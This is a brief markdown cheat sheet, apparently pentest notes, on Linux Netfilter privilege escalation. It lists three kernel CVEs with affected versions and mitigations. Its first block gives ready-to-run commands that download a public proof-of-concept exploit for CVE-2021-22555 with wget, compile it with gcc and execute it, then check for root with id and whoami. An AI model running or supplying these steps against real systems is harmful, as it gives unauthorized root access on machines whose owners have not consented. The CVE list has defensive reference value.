# Netfilter

## Check Kernel Version

```bash
uname -r
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

## Verify Root Access

```bash
id
whoami
```

---

## Key Concepts

* **Netfilter:** Kernel framework for packet filtering and NAT.
* **iptables / nftables:** User-space rule management tools.
* **Common Vulnerability Types:**

  * Use-after-free
  * Out-of-bounds write

---

## Vulnerabilities

### CVE-2021-22555

* Kernel 2.6 - 5.11
* Local privilege escalation
* Mitigation: kernel update

### CVE-2022-25636

* Kernel 5.4 - 5.6.10
* Local privilege escalation
* Can cause system instability
* Mitigation: kernel update

### CVE-2023-32233

* Kernel ≤ 6.3.1
* Exploits nftables anonymous sets
* Mitigation: kernel update
